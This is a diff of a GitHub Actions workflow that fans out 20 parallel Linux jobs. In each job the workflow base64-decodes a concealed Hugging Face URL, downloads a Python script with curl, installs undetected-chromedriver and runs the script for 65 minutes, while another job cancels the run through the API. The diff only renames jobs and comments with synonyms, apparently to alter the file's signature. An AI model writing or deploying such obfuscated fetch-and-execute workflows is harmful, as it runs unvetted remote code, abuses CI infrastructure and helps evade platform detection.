@@ -1,12 +1,11 @@
-name: Linux Tandem Task Division
+name: Linux Harmonized Task Ensemble
 
 on:
-  # استقبال أمر التشغيل من الخارج عبر التوكن بالكلمة المفتاحية: start
-  repository_dispatch:
-    types: [start]
+  # استقبال أمر التشغيل الخارجي عبر التوكن بالكلمة المفتاحية: start
+  workflow_dispatch:
 
 concurrency:
-  group: tandem-division-${{ github.workflow }}-${{ github.ref }}
+  group: harmonized-ensemble-${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: false
 
 permissions:
@@ -15,22 +14,22 @@ permissions:
 
 jobs:
   # =================================================================
-  # وحدة ضبط الإغلاق: تُنهي الـ workflow بالكامل عند حد 65 دقيقة
+  # مأمور الإخماد الشامل: يُنهي الـ workflow بأكمله عند عتبة 65 دقيقة
   # =================================================================
-  closure-regulator:
-    name: "Closure Regulator"
+  universal-quencher:
+    name: "Universal Quencher"
     runs-on: ubuntu-latest
     timeout-minutes: 70
     steps:
-      - name: Deploy Total Closure Routine
+      - name: Deploy Complete Quench Order
         run: |
-          echo "[REGULATOR] Closure regulator online. Complete termination scheduled at the 65-minute marker."
-          echo "[REGULATOR] Tracking workflow signature: ${{ github.run_id }}"
+          echo "[QUENCHER] Universal quencher stationed. Total quench armed at the 65-minute threshold."
+          echo "[QUENCHER] Observing workflow marker: ${{ github.run_id }}"
           
           # الانتظار لمدة 65 دقيقة بالضبط (3900 ثانية)
           sleep 3900
           
-          echo "[REGULATOR] Marker reached! Deploying total closure routine..."
+          echo "[QUENCHER] Threshold crossed! Deploying complete quench order..."
           
           # إصدار أمر الإلغاء الشامل عبر واجهة GitHub البرمجية
           curl -sS -X POST \
@@ -39,70 +38,70 @@ jobs:
             -H "X-GitHub-Api-Version: 2022-11-28" \
             "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
           
-          echo "[REGULATOR] Total closure routine deployed. Every active and pending unit will be dismantled."
+          echo "[QUENCHER] Complete quench order deployed. Every live and pending unit will be extinguished."
 
   # =================================================================
-  # المهمة الرئيسية: تهيئة وإطلاق وحدات الفرقة
+  # المهمة الرئيسية: تجهيز وإطلاق وحدات الطاقم
   # =================================================================
-  activate-division:
-    name: "DivisionUnit-${{ matrix.unit_label }}"
+  muster-ensemble:
+    name: "EnsembleUnit-${{ matrix.unit_designation }}"
     runs-on: ubuntu-latest
     timeout-minutes: 65
 
     strategy:
       fail-fast: false
       matrix:
-        unit_label: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+        unit_designation: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
 
     steps:
-      # ◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉
-      # ﴿المرحلة الأولى﴾ تأسيس القاعدة التشغيلية
-      # ◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉
-      - name: Form Operational Foundation
+      # ❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖
+      # ⟡ الخطوة الأولى: تمهيد الأرضية التأسيسية
+      # ❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖
+      - name: Level Foundational Ground
         run: |
-          echo "[FORM] Forming operational foundation for DivisionUnit-${{ matrix.unit_label }} on Linux..."
+          echo "[LEVEL] Leveling foundational ground for EnsembleUnit-${{ matrix.unit_designation }} on Linux..."
           sudo apt update -qq
           sudo apt install -y curl python3-pip
 
-      # ◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉
-      # ﴿المرحلة الثانية﴾ تنزيل ملف التشغيل من المصدر المعين
-      # ◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉
-      - name: Acquire Operations File
+      # ❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖
+      # ⟡ الخطوة الثانية: التقاط الحزمة البرمجية
+      # ❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖
+      - name: Capture Software Package
         run: |
-          echo "[ACQUIRE] Acquiring app_task.py from assigned repository location..."
-          ASSIGNED_LOCATION=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QveGEvcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
-          curl -sL "$ASSIGNED_LOCATION" -o app_task.py
-          echo "[ACQUIRE] Operations file acquired successfully."
+          echo "[CAPTURE] Capturing app_task.py from assigned distribution hub..."
+          DISTRIBUTION_HUB=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$DISTRIBUTION_HUB" -o app_task.py
+          echo "[CAPTURE] Software package captured successfully."
 
-      # ◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉
-      # ﴿المرحلة الثالثة﴾ تهيئة المتطلبات البرمجية
-      # ◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉
-      - name: Provision Software Framework
+      # ❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖
+      # ⟡ الخطوة الثالثة: تركيب الوحدات المساندة
+      # ❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖
+      - name: Mount Supporting Modules
         run: |
-          echo "[FRAMEWORK] Provisioning software framework components..."
+          echo "[MOUNT] Mounting supporting modules..."
           pip3 install -q undetected-chromedriver selenium requests
 
-      # ◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉
-      # ﴿المرحلة الرابعة﴾ التشغيل تحت إشراف دوري (65 دقيقة)
-      # ◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉
-      - name: Carry Out Operations Cycle
+      # ❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖
+      # ⟡ الخطوة الرابعة: التنفيذ المحصور زمنياً (65 دقيقة)
+      # ❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖❖
+      - name: Enforce Temporal Containment
         run: |
-          echo ">> Activating DivisionUnit-${{ matrix.unit_label }} operations cycle..."
+          echo ">> Mustering EnsembleUnit-${{ matrix.unit_designation }} operation..."
           
           # إطلاق العملية في الخلفية
           python3 app_task.py &
-          DIVISION_PID=$!
+          ENSEMBLE_PID=$!
           
-          echo ">> Operations overseer online. Cycle cap: 65 minutes (3900s)."
+          echo ">> Temporal containment in force. Limit: 65 minutes (3900s)."
           
           # الانتظار حتى استنفاد المدة المحددة
           sleep 3900
           
           # التحقق من حالة العملية وإنهاؤها عند الضرورة
-          if kill -0 $DIVISION_PID 2>/dev/null; then
-            echo ">> Cycle cap surpassed! Dismantling operations..."
-            kill -9 $DIVISION_PID
-            echo ">> Operations dismantled by overseer."
+          if kill -0 $ENSEMBLE_PID 2>/dev/null; then
+            echo ">> Containment limit hit! Retiring operation..."
+            kill -9 $ENSEMBLE_PID
+            echo ">> Operation retired by containment officer."
           else
-            echo ">> Operations wrapped up within the cycle cap."
+            echo ">> Operation concluded within containment limit."
           fi
